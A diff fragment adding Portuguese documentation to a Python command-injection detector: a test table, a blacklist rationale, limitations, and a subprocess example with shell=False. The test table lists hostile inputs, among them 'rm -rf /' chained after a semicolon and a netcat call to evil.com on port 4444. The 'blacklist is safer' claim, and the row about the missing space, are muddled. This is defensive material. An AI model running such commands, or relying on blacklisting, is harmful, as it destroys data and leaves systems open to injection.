@@ -51,3 +51,38 @@ if __name__ == "__main__":
     comando_usuario = input("Digite o comando a ser analisado: ")
     resultado = verificar_comando(comando_usuario)
     print(f"\nResultado: {resultado}")
+    
+    
+# 🧪 Exemplos de Teste
+
+| Entrada                          | Resultado            | Motivo                              |
+|----------------------------------|----------------------|-------------------------------------|
+| `ls -la`                         | Comando Seguro ✅    | Nenhum caractere suspeito           |
+| `dir`                            | Comando Seguro ✅    | Seguro no Windows                   |
+| `cat arquivo.txt; rm -rf /`      | Comando Suspeito ⚠️ | Contém `;`                          |
+| `whoami && whoami`               | Comando Suspeito ⚠️ | Contém `&&`                         |
+| `ping 8.8.8.8nc evil.com 4444`   | Comando Suspeito ⚠️ | Falta espaço antes do comando malicioso (técnica comum) |
+| `echo $HOME`                     | Comando Suspeito ⚠️ | Contém `$`                          |
+
+# ✅ Filosofia da Solução
+
+> **"É mais seguro bloquear o que é claramente perigoso do que tentar permitir apenas o que é seguro."**
+
+Em vez de criar uma **lista branca** complexa (impossível de manter), usamos uma **lista negra** simples e eficaz focada nos operadores mais usados em ataques de **Command Injection**.
+
+# ⚠️ Limitações (Importante!)
+
+Esta é uma **defesa básica**. Não substitui:
+
+- Uso de `subprocess.run()` com `shell=False` (**recomendado!**)
+- Validação rigorosa de entrada
+- Princípio do menor privilégio
+- Sanitização com bibliotecas como `shlex` ou `bleach`
+
+### Melhor prática real em Python:
+
+```python
+import subprocess
+
+# Seguro e recomendado
+subprocess.run(["ls", "-la"], shell=False)
